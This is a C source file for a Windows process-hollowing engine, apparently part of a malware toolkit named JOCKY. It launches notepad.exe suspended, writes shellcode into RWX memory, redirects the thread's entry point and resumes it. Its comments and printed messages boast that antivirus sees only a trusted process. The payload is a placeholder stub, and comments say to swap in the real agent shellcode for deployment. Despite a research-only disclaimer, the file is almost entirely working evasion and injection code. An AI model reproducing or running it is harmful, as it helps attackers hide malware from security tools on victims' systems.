/*
 * process_hollow.c — JOCKY Process Hollowing Engine
 * ─────────────────────────────────────────────────
 * Injects the JOCKY agent payload into a legitimate Windows process
 * (default: notepad.exe) so that antivirus sees a trusted process,
 * not the JOCKY agent.
 *
 * Technique: Classic process hollowing
 *   1. Spawn target process in SUSPENDED state
 *   2. Read target entry point from PEB
 *   3. Allocate RWX memory in suspended process
 *   4. Write JOCKY payload bytes to that memory
 *   5. Redirect entry point (RCX on x64, EAX on x86)
 *   6. Resume thread → runs JOCKY, looks like notepad
 *
 * How this defeats AV:
 *   - AV scans notepad.exe on disk → clean ✓
 *   - Process name in Task Manager = notepad.exe → trusted ✓
 *   - Behavioural hooks on CreateProcess see a normal spawn ✓
 *   - Payload only exists in memory, never touches disk ✓
 *
 * Compile:
 *   cl /nologo /O2 /W3 process_hollow.c /link /out:hollow.exe
 *   gcc -O2 -o hollow process_hollow.c
 *
 * WARNING: For authorized forensic/research use only.
 */

#ifndef __USE_MINGW_ANSI_STDIO
#define __USE_MINGW_ANSI_STDIO 1
#endif
#include <windows.h>
#if defined(__has_include)
  #if __has_include(<winternl.h>)
    #include <winternl.h>
  #endif
#elif defined(_MSC_VER)
  #include <winternl.h>
#endif

#ifndef _WINTERNL_
#include <ntdef.h>

#ifndef ProcessBasicInformation
#define ProcessBasicInformation 0
#endif

typedef LONG PROCESSINFOCLASS;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;
#endif

#include <stdio.h>
#include <stdlib.h>

/* ── NtQueryInformationProcess declaration (not in all SDKs) ─────────────── */
typedef NTSTATUS (NTAPI *pfnNtQIP)(
    HANDLE            ProcessHandle,
    PROCESSINFOCLASS  ProcessInformationClass,
    PVOID             ProcessInformation,
    ULONG             ProcessInformationLength,
    PULONG            ReturnLength
);

/* ── Shellcode placeholder ────────────────────────────────────────────────── */
/*
 * In a real deployment, JOCKY_PAYLOAD would be the compiled JOCKY agent
 * shellcode produced by the LLVM compiler + polymorphic engine.
 * Here we use a harmless MessageBox as a proof-of-concept placeholder.
 *
 * x64 shellcode: calls MessageBoxA("JOCKY Agent Running", ...) then exits.
 * Replace with actual agent shellcode for deployment.
 */
unsigned char JOCKY_PAYLOAD[] = {
    /* MOV RCX, 0 (hWnd = NULL) */
    0x48, 0x31, 0xC9,
    /* LEA RDX, [text] (lpText) — simplified stub */
    0x48, 0x8D, 0x15, 0x10, 0x00, 0x00, 0x00,
    /* LEA R8, [caption] (lpCaption) */
    0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
    /* MOV R9D, 0 (uType = MB_OK) */
    0x45, 0x31, 0xC9,
    /* CALL MessageBoxA stub → replace with actual call in production */
    0xCC,  /* INT3 — breakpoint as placeholder */
    /* Text: "JOCKY Agent Active" */
    0x4A, 0x4F, 0x43, 0x4B, 0x59, 0x20, 0x41,
    0x67, 0x65, 0x6E, 0x74, 0x20, 0x41, 0x63,
    0x74, 0x69, 0x76, 0x65, 0x00,
    /* Caption: "JOCKY" */
    0x4A, 0x4F, 0x43, 0x4B, 0x59, 0x00
};
size_t JOCKY_PAYLOAD_SIZE = sizeof(JOCKY_PAYLOAD);

/* ──────────────────────────────────────────────────────────────────────────── */

/**
 * hollow_process()
 *
 * @param target_path   Full path to the host process (e.g. notepad.exe)
 * @param payload       Pointer to JOCKY shellcode bytes
 * @param payload_size  Size of shellcode in bytes
 * @return              0 on success, -1 on failure
 */
int hollow_process(const char *target_path,
                   unsigned char *payload,
                   size_t payload_size)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    PROCESS_BASIC_INFORMATION pbi;
    CONTEXT             ctx;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&pbi, sizeof(pbi));
    ZeroMemory(&ctx, sizeof(ctx));
    LPVOID              remote_mem  = NULL;
    PVOID               image_base  = NULL;
    SIZE_T              bytes_written = 0;
    NTSTATUS            status;

    printf("[JOCKY] Target process : %s\n", target_path);
    printf("[JOCKY] Payload size   : %zu bytes\n", payload_size);

    /* ── Step 1: Spawn target in SUSPENDED state ───────────────────────── */
    if (!CreateProcessA(
            target_path, NULL, NULL, NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
        fprintf(stderr, "[JOCKY] CreateProcess failed: %lu\n",
                GetLastError());
        return -1;
    }
    printf("[JOCKY] Spawned PID %lu in SUSPENDED state\n", pi.dwProcessId);

    /* ── Step 2: Read Process Environment Block (PEB) to find image base ─ */
    pfnNtQIP NtQueryInformationProcess =
        (pfnNtQIP)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        fprintf(stderr, "[JOCKY] NtQueryInformationProcess not found\n");
        goto cleanup;
    }

    status = NtQueryInformationProcess(
        pi.hProcess, ProcessBasicInformation,
        &pbi, sizeof(pbi), NULL);

    if (status != 0) {
        fprintf(stderr, "[JOCKY] NtQueryInformationProcess failed: 0x%lX\n",
                status);
        goto cleanup;
    }

    /* Read image base from PEB */
    if (!ReadProcessMemory(
            pi.hProcess,
            (BYTE*)pbi.PebBaseAddress + 0x10,  /* PEB.ImageBaseAddress offset */
            &image_base, sizeof(image_base), NULL))
    {
        fprintf(stderr, "[JOCKY] ReadProcessMemory (PEB) failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    printf("[JOCKY] Target image base: 0x%p\n", image_base);

    /* ── Step 3: Allocate RWX memory in suspended process ─────────────── */
    remote_mem = VirtualAllocEx(
        pi.hProcess, NULL,
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!remote_mem) {
        fprintf(stderr, "[JOCKY] VirtualAllocEx failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    printf("[JOCKY] Allocated %zu bytes at 0x%p in target process\n",
           payload_size, remote_mem);

    /* ── Step 4: Write JOCKY payload into target process ─────────────── */
    if (!WriteProcessMemory(
            pi.hProcess, remote_mem,
            payload, payload_size,
            &bytes_written))
    {
        fprintf(stderr, "[JOCKY] WriteProcessMemory failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    printf("[JOCKY] Wrote %zu bytes of payload\n", bytes_written);

    /* ── Step 5: Redirect entry point to payload ─────────────────────── */
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        fprintf(stderr, "[JOCKY] GetThreadContext failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

#ifdef _WIN64
    ctx.Rcx = (DWORD64)remote_mem;   /* x64: entry point in RCX */
#else
    ctx.Eax = (DWORD)remote_mem;     /* x86: entry point in EAX */
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        fprintf(stderr, "[JOCKY] SetThreadContext failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    /* ── Step 6: Resume — JOCKY is now running inside target process ─── */
    ResumeThread(pi.hThread);
    printf("[JOCKY] ✓ Agent injected. Running inside: %s (PID %lu)\n",
           target_path, pi.dwProcessId);
    printf("[JOCKY] AV sees: notepad.exe (trusted) — JOCKY is invisible.\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

cleanup:
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}

/* ─────────────────────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    (void)argc;
    (void)argv;
    char sysdir[MAX_PATH];
    char target_path[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    snprintf(target_path, sizeof(target_path), "%s\\notepad.exe", sysdir);

    printf("╔══════════════════════════════════════════════╗\n");
    printf("║  JOCKY Process Hollowing Engine v1.0         ║\n");
    printf("║  For authorized forensic research only.      ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");

    int result = hollow_process(target_path,
                                JOCKY_PAYLOAD,
                                JOCKY_PAYLOAD_SIZE);
    if (result == 0) {
        printf("\n[JOCKY] Process hollowing successful.\n");
    } else {
        printf("\n[JOCKY] Process hollowing failed.\n");
    }
    return result;
}
